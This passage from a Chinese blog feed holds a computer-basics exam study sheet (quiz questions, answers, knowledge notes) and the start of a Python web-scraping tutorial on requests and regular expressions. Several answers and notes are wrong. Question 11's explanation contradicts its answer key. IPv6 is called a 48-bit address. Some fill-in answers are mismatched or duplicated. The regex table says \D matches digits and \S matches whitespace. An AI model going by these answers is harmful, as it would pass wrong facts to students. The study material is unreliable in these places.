</summary>微处理器是计算机一切活动的核心，因此微型计算机的发展是以微处理器的发展为表征的。本题正确答案为A</details>9．世界上公认的第一台电子计算机诞生在____。A)1945年 b)1946年 C)1948年 D)1952年<details><summary style='color:pink'>解答： </summary>世界上公认的第一台电子计算机ENIAC(埃尼阿克)于1946年在美国诞生。 本题正确答案为B。</details>10．个人计算机属于____。A)小巨型机 B)中型机 C)小型机 D)微机<details><summary style='color:pink'>解答： </summary>我国计算机界根据计算机的性能指标，如机器规模的大小、运算速度的高低、主存储器容量的大小、指令系统性能的强弱以及机器价格等，将计算机分为巨型机、大型机、中型机、小型机、微型机和单片机6大类。目前，国外还有一种比较流行的看法，根据计算机的性能指标及厂家生产的计算机的主要面向应用对象，把计算机分为巨型机、小巨型机、大型机、小型机、工作站和个人计算机6大类。其中，个人计算机(PersonalComputer)，又称为微型计算机(MicroComputer)。本题正确答案为D</details>11．通常，在微机中所指的80486是____。A)微机名称 B)微处理器型号 C)产品型号 D)主频<details><summary style='color:pink'>解答： </summary>CPU的品质直接决定了微机的档次，在奔腾出现之前，微机名称中直接使用微机中的CPU型号，486机表示了它们使用的CPU芯片为80486。主频与所用微处理器档次有关，如同样是80486芯片，其主频可能为60MHz，也可能为100MHz。目前占主流的微处理器产品是Intel公司的PentiumIII和PentiunIV微处理器芯片。本题正确答案为D。</details>12．一个字节的二进制位数是____。A)2 B)4 C)8 D)16<details><summary style='color:pink'>解答： </summary>一个字节定义为8位二进制位。本题正确答案为C。</details>13．在微机中，bit的中文含义是____。A)二进制位 B)字节 C)字 D)双字<details><summary style='color:pink'>解答： </summary>在微机中，信息的最小单位为二进制位，用bit来表示；8位二进制构成一个字节，用Byte来表示；一个或一个以上字节可组成一个二进制表示的字，字长可以是8位、16位、32位或64位；两个字长的字，称为双字。本题正确答案为A。</details>14．计算机内部使用的数是____。A)二进制数 B)八进制数 C)十进制数 D)十六进制数<details><summary style='color:pink'>解答： </summary>在计算机内部，电路中常用的器件具有两种不同的稳定状态：高电平和低电平。这两种状态之间能相互转换。因此，在计算机内部，一切信息的存放、处理和传送都采用二进制数的形式。本题的正确答案为A。</details>15．在微机中，存储容量为5MB，指的是____。A)5×lO00×1000个字节B)5×1000×1024个字节C)5×1024×1000个字节D)5×1024×1024个字节<details><summary style='color:pink'>解答： </summary>因为计算机内部的计数基本单位是2，2的10次幂是1024。所以1024个字节为1K字节，写做1KB。1024×1024个字节为1M字节，记做1MB。本题正确答案为D。</details>16.400个24×24点阵汉字的字形库存储容量是____。A)28800个字节B)0.23604M个二进制位C)0.8K个字节D)288个二进制位<details><summary style='color:pink'>解答： </summary>24×24点阵的一个汉字字模共有24行；每行有24列，占24个二进制位，即3个字节。因此，24×24点阵的一个汉字字模占24×3＝72个字节，400个汉字共占72×400＝28800个字节。因此，本题的正确答案为A。</details>17．在下列设备中，属于输出设备的是____。A)硬盘 B)键盘 C)鼠标 D)打印机<details><summary style='color:pink'>解答： </summary>硬盘是一种存储介质，连同驱动器和适配卡共同组成外存储器；键盘与鼠标均属于输入设备3打印机将计算机中的文件输出至纸上供用户阅读，是输出设备。本题正确答案为D。</details><p>18．在微型计算机中，下列设备属于输入设备的是——。<br>A)打印机 B)显示器 C)键盘 D)硬盘</p><details><summary style='color:pink'>解答： </summary>打印机和显示器均属于输出设备，只有键盘属于常用的输入设备，硬盘为存储器的存储介质。本题正确答案为C。</details>19．鼠标是微机的一种____。A)输出设备 B)输入设备 C)存储设备 D)运算设备<details><summary style='color:pink'>解答： </summary>鼠标是一种比传统键盘的光标移动键更加方便、更加准确快捷的输入设备。鼠标的优越性已被越来越多的人所认识。本题正确答案为B。</details><p>20．断电会使原存信息丢失的存储器是____。<br>A)半导体RAlkI B)硬盘 C)ROM D)软盘</p><details><summary style='color:pink'>解答： </summary>硬盘存储器、软盘存储器和ROM存储器都属非易失性存储器，其中所存信息不会因断电而丢失；只有半导体RAM存储器，断电后原存信息会丢失。本题正确答案为A。</details>21．在下列存储器中，访问速度最快的是____。A)硬盘存储器 B)软盘存储器C)磁带存储器 D)半导体RAM(内存储器)<details><summary style='color:pink'>解答： </summary>内存储器的优点在于访问速度快，但是价格较贵，存储容量比外存储器小。外存储器单位存储容量的价格便宜，存储容量大，但是存取速度较慢。通常的外存储器包括硬盘存储器、软盘存储器和磁带存储器。半导体RAM通常作为内存储器使用。本题正确答案为D。</details><p>22．微型计算机硬件系统主要包括存储器、输入设备、输出设备和____。<br>A)中央处理器 B)运算器 C)控制器 D)主机</p><details><summary style='color:pink'>解答： </summary>一个完整的计算机硬件系统包括运算器、控制器、存储器、输入设备和输出设备，运算器和控制器合称中央处理器或微处理器，中央处理器与内存储器合在一起称为主机。本题正确答案为A。</details><p>23．硬盘连同驱动器是一种____。<br>A)内存储器 B)外存储器 C)只读存储器 D)半导体存储器</p><details><summary style='color:pink'>解答： </summary>内存储器访问速度快，但是价格较责，存储容量比外存储器小。外存储器单位存储容量的价格便宜，存储容量大，但是存取速度较慢。硬盘连同驱动器是磁性随机存储器，由于它的价格便宜，存储容量大，存取速度较慢，所以通常作为外存储器使用。本题正确答案为B。</details>24．把微机中的信息传送到软盘上，称为____。A)拷贝 B)写盘 C)读盘 D)输出<details><summary style='color:pink'>解答： </summary>拷贝是指将信息按照原样复制；将信息传送到屏幕等输出设备上，称为输出；读盘是指将磁盘上的信息传送到另一个地方；写盘是指把信息传送到磁盘上。本题正确答案为B。</details>25．计算机的内存储器比外存储器____。A)速度快 B)存储量大 C)便宜 D)以上说法都不对<details><summary style='color:pink'>解答： </summary>内存储器访问速度快，但是价格较贵，存储容量比外存储器小。本题正确答案为A。</details>26．下列可选项，都是硬件的是____。A)Windows、ROM和CPUB)WPS、RAM和显示器C)ROM、RAM和PascalD)硬盘、光盘和软盘<details><summary style='color:pink'>解答： </summary>A、B、C各项中，A中的Windows、B中的WPS、C中的Pascal不是硬件；只有D中的各项均为计算机的存储设备，属于硬件。本题正确答案为D。</details>27．具有多媒体功能的微机系统，常用CD-ROM作为外存储器，它是____。A)只读软盘存储器B)只读光盘存储器C)可读写的光盘存储器D)可读写的硬盘存储器<details><summary style='color:pink'>解答： </summary>CD-ROM的英语原文是：Compact Disc-Read OnlyMemory。中文译为名只读光盘存储器。具有多媒体功能的微机系统，除了配备软盘存储器和硬盘存储器之外，还配备有只读光盘存储器CD-ROM。本题正确答案为B。</details>28．3.5英寸软盘的移动滑块从写保护窗口上移开，此时____。A)写保护 B)读保护 C)读写保护 D)驱动器定位<details><summary style='color:pink'>解答： </summary>3.5英寸软盘的移动滑块从写保护窗口上移开时，起写保护作用，此时只能够读盘，不能写盘。本题正确答案为A。</details><p>29．目前，微机上常用3.5英寸的双面高密度软盘的存储容量为____。<br>A)360KB B)720KB C)1.2MB D)1．44MB</p><details><summary style='color:pink'>解答： </summary>5.25英寸双面低密度软盘的容量为360KB；高密度则为1.2MB。3．5英寸双面低密度软盘的容量为720KB；高密则为1．44MB。本题正确答案为D。</details>30．十进制数14对应的二进制数是____。A)1111 B)1110 C)1100 D)1010<details><summary style='color:pink'>解答： </summary>十进制整数N转换为二进制的方法是：将N不断的除以二，直到商为0，将每一步的余数从右向左排列，即可得到对应的二进制数(即除以2反序取余)。14 mod 2＝0， 14 div 2＝7； 7 mod 2＝1， 7 div 2＝3； 3 mod 2＝1， 3 div2＝1： 1 mod 2</details>31.第二代电子计算机采用的电子元件是A.电子管B.晶体管C.中、小规模集成电路D.大、超大规模集成电路<details><summary style='color:pink'>解答： </summary>B</details><p>32.基本 ASCII 表中包含的字符数是<br>A.64<br>B.128<br>C.256<br>D.512</p><details><summary style='color:pink'>解答： </summary>B</details>33.由一组与机器语言指令一一对应的符号指令和简单语法组成的语言是A.机器语言B.高级语言C.汇编语言D.第四代语言<details><summary style='color:pink'>解答： </summary>C</details>34.要查找文件或者文件夹，可以使用 “开始 ”菜单中的A.搜索B.运行C.替换D.全选<details><summary style='color:pink'>解答： </summary>A</details>35.一般情况下删除的文件会暂时移到A.回收站B.我的电脑C.网上邻居D.我的文档<details><summary style='color:pink'>解答： </summary>A</details>36.计算机网络按网络环境不同可分为A.有线网、无线网B.集中式、分布式C.部门网络、企业网络、校园网络D.公用网、专用网<details><summary style='color:pink'>解答： </summary>C</details>37.传输信号的通道被称为A.数据B.带宽C.信道D.控制器<details><summary style='color:pink'>解答： </summary>C</details>38.网络体系结构中，属于逻辑结构元素的是A.集成电路B.计算机操作系统C.信道D.计算机部件<details><summary style='color:pink'>解答： </summary>B</details>39.异步传输模式的英文缩写是A.LLCB.SDHC.BPSD.ATM<details><summary style='color:pink'>解答： </summary>D</details>40.“ 异型网络 ”是指网络中具有不同的A.协议B.服务器C.传输介质D.工作站<details><summary style='color:pink'>解答： </summary>A</details>41.网络操作系统不具备的特征是A.与硬件无关B.多用户支持C.多种客户端支持D.无目录服务<details><summary style='color:pink'>解答： </summary>C</details>42.下列选项中，属于 Microsoft 公司的网络操作系统是A.VINESB.Windows Server 2003C.NFSD.NetWare<details><summary style='color:pink'>解答： </summary>B</details>43.UNIX 系统中，存放对各种外围设备进行访问的特别文件的目录是A.etcB.devC.includeD.bin<details><summary style='color:pink'>解答： </summary>B</details>44.Linux 对用户人数的要求是A.有固定的用户数限制B.需付费购买用户数C.无最多用户人数的限制D.最大用户人数是 1000<details><summary style='color:pink'>解答： </summary>C</details>45.更改信息和拒绝用户使用资源的攻击称为A.主动攻击B.被动攻击C.双向攻击D.拒绝攻击<details><summary style='color:pink'>解答： </summary>A</details>46.以假身份建立连接的攻击属于A.伪造连接初始化B.拒绝服务攻击C.拒绝报文服务D.更改报文流<details><summary style='color:pink'>解答： </summary>A</details>47.关于防火墙的优点叙述错误的是A.防火墙能强化安全策略B.防火墙限制暴露用户点C.防火墙能防备全部的威胁D.防火墙是一个安全策略的检查站<details><summary style='color:pink'>解答： </summary>C</details>48.电子邮件有自己固定的格式，包括邮件头和A.电子邮箱B.电子邮件地址C.简单邮件传输协议D.邮件体<details><summary style='color:pink'>解答： </summary>D</details>49.“ 超文本传输协议 ”的英文缩写是A.WEBB.HTTPC.WWWD.HTML<details><summary style='color:pink'>解答： </summary>B</details>## 填空<p>1.计算机内部表示汉字的编码是 ________。</p><details><summary style='color:pink'>解答： </summary>机内码</details><p>2.运算器和控制器一起构成 __________。</p><details><summary style='color:pink'>解答： </summary>央处理单元( CPU)</details><p>3.浏览计算机最常用的两种工具是 “我的电脑 ”和“ ______”。</p><details><summary style='color:pink'>解答： </summary>资源管理器</details><p>4.分组交换也可称为 _______。</p><details><summary style='color:pink'>解答： </summary>包交换</details>5.计算机网络的三个主要组成部分是主机、通信子网和 ______。<details><summary style='color:pink'>解答： </summary>通信协议</details><p>6.若一条线路上有多个站，则通信线路是 ____结构。</p><details><summary style='color:pink'>解答： </summary>星形</details><p>7.一般把计算机或终端这类数据处理设备称为 _____。(英文缩写 )</p><details><summary style='color:pink'>解答： </summary>termination</details><p>8.对传输中出现的差错，原则上有两种处理方法：自动纠错和 ___。</p><details><summary style='color:pink'>解答： </summary>有确认的无连接方式服务</details><p>9.IEEE802.2 标准规定的逻辑链路控制 (LLC) 子层协议标准向网际层提供的三种服务是： 无确认的无连接方式服务、面向连接方式服务和 ____。</p><details><summary style='color:pink'>解答： </summary>有确认的无连接方式服务</details>10.ATM 信元有两种不同的首部，分别对应于用户 - 网络接口 (UNI) 和____。<details><summary style='color:pink'>解答： </summary>网络结点接口（NNI）</details>## 基本知识点<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">CAD：计算机辅助设计<br>CAI：计算机辅助教学<br>CAM：计算机辅助制造<br>CFS：计算机辅助测试<br><br>计算机之父——冯·诺伊曼<br>第一代计算机于<span class="hljs-number">1946</span>诞生，名为ENIAC，发明者：莫契利·埃克特<br>第四代计算机于<span class="hljs-number">70</span>年代初发展起来<br>根据摩尔定律，单块集成线路大概每<span class="hljs-number">18</span>月翻一番<br>IT业第一大定律——摩尔定律<br>微型计算机逻辑元件：大/超大规模集成电路<br><br>第二代计算机基本元件：晶体管<br>第一代计算机基本元件：电子管<br><br>巨型机——国家国力与竞争力指标<br>PC——第四代计算机<br>计算机一般指电子数字式计算机<br>计算机方向：微型化、巨型化<br>外部设备与机器连接方式：串行、并行<br><br>主频决定计算机运行速度<br>控制总线传送控制信号与时序信号<br><span class="hljs-meta">CPU</span>技术指标：主频、集成度、字长、Cache<br>指令执行：取指、译码、执行三个阶段<br>启动系统即将系统装入内存<br><br>声卡——一块专用电路板<br>分辨率：同一面积下像素越多分辨率越高<br>磁盘存储信息于多个不同直径同心圆上，同心圆称为磁道（具体见图一）<br><br>OSI基本结构为<span class="hljs-number">7</span>层<br>第一个计算机网络是ARPANET，目的是为美国军队服务<br><br>局域网：LAN 城域网：MAN 广域网：WAN<br><span class="hljs-built_in">ip</span>地址分类（集体见图二）：<br><span class="hljs-number">1</span>、A类<span class="hljs-built_in">IP</span>地址<br>　　一个A类<span class="hljs-built_in">IP</span>地址由<span class="hljs-number">1</span>字节的网络地址和<span class="hljs-number">3</span>字节主机地址组成，网络地址的最高位必须是“<span class="hljs-number">0</span>”， 地址范围从<span class="hljs-number">1.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> 到<span class="hljs-number">126.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>。可用的A类网络有<span class="hljs-number">126</span>个，每个网络能容纳<span class="hljs-number">1</span>  亿多个主机。<br>　　<span class="hljs-number">2</span>、B类<span class="hljs-built_in">IP</span>地址<br>　　一个B类<span class="hljs-built_in">IP</span>地址由<span class="hljs-number">2</span>个字节的网络地址和<span class="hljs-number">2</span>个字节的主机地址组成，网络地址的最高位必须是“<span class="hljs-number">10</span>”，地址范围从<span class="hljs-number">128.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>到<span class="hljs-number">191.255</span><span class="hljs-number">.255</span><span class="hljs-number">.255</span>。可用的B类网络有<span class="hljs-number">16382</span>    个，每个网络能容纳<span class="hljs-number">6</span>万多个主机 。<br>　　<span class="hljs-number">3</span>、C类<span class="hljs-built_in">IP</span>地址<br>　　一个C类<span class="hljs-built_in">IP</span>地址由<span class="hljs-number">3</span>字节的网络地址和<span class="hljs-number">1</span>字节的主机地址组成，网络地址的最高位必须是“<span class="hljs-number">110</span>”。范围从<span class="hljs-number">192.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>到<span class="hljs-number">223.255</span><span class="hljs-number">.255</span><span class="hljs-number">.255</span>。C类网络可达<span class="hljs-number">209</span>万余个，每个网络 能容纳<span class="hljs-number">254</span>个主机。<br>　　<br>IPv4：<span class="hljs-built_in">ip</span>由<span class="hljs-number">4</span>个8bit二进制位组成，即<span class="hljs-number">32</span>位地址<br>IPv6：<span class="hljs-built_in">ip</span>由<span class="hljs-number">6</span>个8bit二进制位组成，即<span class="hljs-number">48</span>位地址<br>　<br>域名组成：主机名、机构名、网络名、顶级域名<br>计算机网络最本质功能——资源共享<br>TCP/<span class="hljs-built_in">IP</span>指传输控制协议和网络协议，广义上是协议集<br><span class="hljs-built_in">ip</span>判断合法与否：（<span class="hljs-number">1</span>-<span class="hljs-number">255</span>）：（<span class="hljs-number">0</span>-<span class="hljs-number">255</span>）：（<span class="hljs-number">0</span>-<span class="hljs-number">255</span>）：（<span class="hljs-number">0</span>-<span class="hljs-number">255</span>）<br>实现网络共享：通过网络协议实现<br>一个<span class="hljs-built_in">IP</span>可以对应多个域名<br><br><span class="hljs-built_in">IP</span>电话——通过Internet打电话<br>发送邮件时不能以文件夹作为附件上传<br>ADSL——非对称数字用户上传（非对称：用户线路下行速率高，上行速率低）<br>文件传输服务采用FTP通信协议<br><br>以电话连接上网，用户必须使用调制调解器<br>家庭/局域网/无线方式都是普通用户接入Internet方式<br>url格式：协议：//<span class="hljs-built_in">IP</span>地址或者域名/路径/文件名<br>宏病毒——针对Office软件的病毒，主要破坏文件<br>病毒连接方式分类：源码型、入侵型、操作系统型、外壳型<br>病毒破坏性类型分类：恶性、极恶性、灾难性、良性病毒<br><br>Raptor不能表示算法，但是可以表示算法流程图<br>人类三大科学思维：理思维论、实验思维、计算思维<br><br>字节不是信息最小单位，但是是存储容量基本单位<br>热启动与冷启动对计算机的影响不同<br><br>IE标题显示脱机工作并不意味着未连接互联网<br>当型循环：while&#123;&#125;  直到型循环：<span class="hljs-built_in">do</span>&#123;&#125;while<br></code></pre></td></tr></table></figure><h3 id="图一：">图一：</h3><p><img src="https://static01.imgkr.com/temp/735fd3345cbc47b4bb5d159b23180062.png" alt="图一"></p><h3 id="图二：">图二：</h3><p><img src="https://static01.imgkr.com/temp/a0958c9d557d41cfbd1c845440d69286.jfif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>School Learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>爬虫近期学习总结</title>
    <link href="/2022/03/14/%E7%88%AC%E8%99%AB%E8%BF%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2022/03/14/%E7%88%AC%E8%99%AB%E8%BF%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="Requests-的基本使用">Requests 的基本使用</h2><p>用<code>requests</code>构建一个请求实现得到网页对应的源代码，对应构造方式有许多，大致整理如下：</p><p><strong>get请求</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> resp = requests.get(url,headers,data)<br></code></pre></td></tr></table></figure><p><strong>post请求</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>resp = requests.post(url,headers,data)<br></code></pre></td></tr></table></figure><p><strong>获取响应码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>resp = requests.post(url,headers,data)<br><span class="hljs-built_in">print</span>(resp.status_code)<br></code></pre></td></tr></table></figure><hr><p>将请求的数据保存在一个变量中，我们可以加入一个<code>.text</code>实现转换成<code>Html</code>文件，同时在转换之前可以加入一个编码，将得到的数据进行对应的编码</p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>resp = requests.post(url,headers,data) <span class="hljs-comment"># 对数据进行请求</span><br>resp.encoding = <span class="hljs-string">&quot;xxx&quot;</span> <span class="hljs-comment"># 编码格式</span><br><span class="hljs-built_in">print</span>(resp.text) <span class="hljs-comment"># 输出html代码</span><br></code></pre></td></tr></table></figure><hr><p>同时在<code>requests</code>之中的<code>url、headers、data</code>分别对应着请求的链接、请求头、请求数据。</p><p>一般请求头是用于伪装自己是浏览器，而避免服务器端拒绝访问。可以通过浏览器的<code>F12</code>进行抓取，请求数据我们可以写入一定<code>Cookies</code>，来实现某些需要登录等，才能完成的抓取。</p><h2 id="正则表达式">正则表达式</h2><p>Regular Expression, 正则表达式, ⼀种使⽤表达式的⽅式对字符串 进⾏匹配的语法规则. 我们抓取到的⽹⻚源代码本质上就是⼀个超⻓的字符串, 想从⾥⾯提 取内容.⽤正则再合适不过了. 正则的优点: 速度快, 效率⾼, 准确性⾼ 正则的缺点: 新⼿上⼿难度有 点⼉⾼. 不过只要掌握了正则编写的逻辑关系, 写出⼀个提取⻚⾯内容的正则 其实并不复杂 正则的语法: 使⽤元字符进⾏排列组合⽤来匹配字符串。</p><p>在线测试正则表达式https://tool.oschina.net/regex/</p><h3 id="常用元字符：具有固定含义的特殊符号">常用元字符：具有固定含义的特殊符号</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\w</span>     匹配字母数字下划线<br><span class="hljs-string">\d</span>     匹配数字<br><span class="hljs-string">\s</span>     匹配空白符<br><span class="hljs-string">\t</span>     匹配一个制表符<br><br>^      匹配字符串的开始<br>$      匹配字符串的结尾<br><br><span class="hljs-string">\W</span>     匹配非字母数字下划线<br><span class="hljs-string">\D</span>     匹配数字<br><span class="hljs-string">\S</span>     匹配空白符<br><br>a|b    匹配字符a或者b<br>()     匹配括号内的表达式，也表示一个组<br>[...]    匹配字符串中的字符<br>[^...]   匹配除了字符组中字符的所有字符<br></code></pre></td></tr></table></figure><h3 id="量词：控制前面元字符出现的次数">量词：控制前面元字符出现的次数</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs excel">*   重复零次或者更多次<br>+   重复一次或者多次<br>?   重复零次或者一次<br>&#123;<span class="hljs-built_in">n</span>&#125;   重复<span class="hljs-built_in">n</span>次<br>&#123;<span class="hljs-built_in">n</span>,&#125;       重复<span class="hljs-built_in">n</span>次或者更多次<br>&#123;<span class="hljs-built_in">n</span>,m&#125;   重复<span class="hljs-built_in">n</span>到m次<br></code></pre></td></tr></table></figure><h3 id="贪婪匹配和惰性匹配">贪婪匹配和惰性匹配</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">.<span class="hljs-emphasis">*贪婪匹配（尽可能多的匹配内容）</span><br><span class="hljs-emphasis">.*</span>?惰性匹配（尽可能少的匹配内容）<br></code></pre></td></tr></table></figure><h3 id="案例">案例</h3><h4 id="案例一">案例一</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html">案例 1<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;jay&quot;</span>&gt;</span>周杰伦<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;jj&quot;</span>&gt;</span>林俊杰<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>测试表达式<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;.*?&quot;</span>&gt;</span>.*?<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>测试结果<br>两处匹配<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;jay&quot;</span>&gt;</span>周杰伦<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;jj&quot;</span>&gt;</span>林俊杰<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="案例二">案例二</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs html">案例 2<br>str: 玩⼉吃鸡游戏, 晚上⼀起上游戏, ⼲嘛呢? 打游戏啊<br>reg: 玩⼉.*?游戏<br>此时匹配的是: 玩⼉吃鸡游戏<br>reg: 玩⼉.*游戏 <br>此时匹配的是: 玩⼉吃鸡游戏, 晚上⼀起上游戏, ⼲嘛呢? 打游<br>戏 <br> <br> <br>str: <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>胡辣汤<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>reg: &lt;.*&gt;<br>结果: <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>胡辣汤<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>str: <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>胡辣汤<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>reg: &lt;.*?&gt;<br>结果:<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>str: <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>胡辣汤<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>饭团<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>reg: <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>.*?<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>结果:<br> <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>胡辣汤<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="RE-模块">RE 模块</h2><p>那么又一个问题来了，正则我会写了，怎么在<code>python</code>程序中使用呢？答案便是 re 模块。</p><h3 id="Findall">Findall</h3><p><code>findall</code> 查找所有，返回list</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">lst = re.findall(<span class="hljs-string">&quot;m&quot;</span>,<span class="hljs-string">&quot;mai le fo len,mai ni mei!&quot;</span>)<br><span class="hljs-built_in">print</span>(lst)<span class="hljs-comment">#[&#x27;m&#x27;,&#x27;m&#x27;,&#x27;m&#x27;]</span><br>lst = re.findall(<span class="hljs-string">r&quot;\d+&quot;</span>,<span class="hljs-string">&quot;5点之前，你要给我5000万&quot;</span>)<br><span class="hljs-built_in">print</span>(lst)<span class="hljs-comment">#[&#x27;5&#x27;,&#x27;5000&#x27;]</span><br></code></pre></td></tr></table></figure><h3 id="Search">Search</h3><p><code>search</code> 会进行匹配，但是如果匹配到了第一个结果就会返回这个结果。如果匹配不上search返回值为None</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">ret = re.search(<span class="hljs-string">r&#x27;\d&#x27;</span>,<span class="hljs-string">&quot;5点之前，你要给我5000万&quot;</span>)<br><span class="hljs-built_in">print</span>(lst)<span class="hljs-comment"># 5</span><br></code></pre></td></tr></table></figure><h3 id="Match">Match</h3><p><code>match</code> 只能从字符串的开头进行匹配</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">ret = re.match(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;abc&#x27;</span>).group()<br><span class="hljs-built_in">print</span>(ret)<span class="hljs-comment"># a</span><br></code></pre></td></tr></table></figure><h3 id="Finditer">Finditer</h3><p><code>finditer</code> 和 <code>findall</code> 